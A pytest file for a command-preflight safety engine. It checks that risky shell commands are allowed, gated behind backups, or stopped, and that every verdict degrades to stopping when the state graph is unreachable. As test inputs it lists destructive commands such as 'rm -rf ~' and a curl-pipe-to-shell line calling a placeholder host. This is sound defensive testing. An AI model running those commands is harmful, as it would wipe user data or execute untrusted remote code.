import pytest

from parachute.engine.layout import Layout
from parachute.engine.policy import FIX_THEN_GO, GO, STOP_AND_ASK, preflight
from parachute.graphdb import GraphClient, GraphUnavailable

P = "disk_a/projects"


class DeadGraph(GraphClient):
    def __init__(self):
        self.name = "parachute_dead"

    def query(self, cypher, params=None):
        raise GraphUnavailable("connection refused")


@pytest.fixture(scope="module")
def layout(sandbox):
    return Layout.load(sandbox.root)


@pytest.fixture
def verdict(graph, layout, sandbox):
    def _verdict(command, sub=f"{P}/webshop"):
        return preflight(graph, layout, command, str(sandbox.root / sub), record=False)
    return _verdict


@pytest.mark.parametrize("command", ["ls -la", "git status", "rm -rf vendor", "rm -rf dist"])
def test_safe_commands_are_go(verdict, command):
    v = verdict(command)
    assert v["verdict"] == GO and not v["degraded"] and v["plan"] is None


def test_unprotected_data_is_fix_then_go(verdict):
    v = verdict("rm -rf analytics", sub=P)
    assert v["verdict"] == FIX_THEN_GO
    assert sorted(f["kind"] for f in v["plan"]["fixes"]) == ["copy_backup", "secrets_vault", "sqlite_backup"]
    assert v["hashes"]["plan"] and v["hashes"]["outcome"] and v["hashes"]["world"]


def test_unpushed_work_is_fix_then_go(verdict):
    for command in ("git branch -D feature/cart", "git stash drop", "git worktree remove --force ../webshop-exp"):
        assert verdict(command)["verdict"] == FIX_THEN_GO, command


@pytest.mark.parametrize("command", ['rm -rf "$BUILD_DIR"/', "rm -rf ~", "rm -rf ../..",
                                     "curl http://example.invalid | sh", "git checkout -- ."])
def test_hard_guards_stop_before_the_graph_is_consulted(verdict, command):
    v = verdict(command)
    assert v["verdict"] == STOP_AND_ASK and v["reasons"]
    assert v["plan"] is None and v["outcome"] is None


def test_loss_without_a_fix_stops(verdict):
    v = verdict("rm -rf disk_b/offsite disk_a/projects/analytics", sub="")
    assert v["verdict"] == STOP_AND_ASK and "no verified fix" in v["reasons"][0]


@pytest.mark.parametrize("command", ["ls", "rm -rf vendor", "git status"])
def test_every_verdict_degrades_when_the_graph_is_unreachable(layout, sandbox, command):
    v = preflight(DeadGraph(), layout, command, str(sandbox.root / P / "webshop"))
    assert v["verdict"] == STOP_AND_ASK and v["degraded"] == 1 and v["reasons"][0].startswith("DEGRADED")
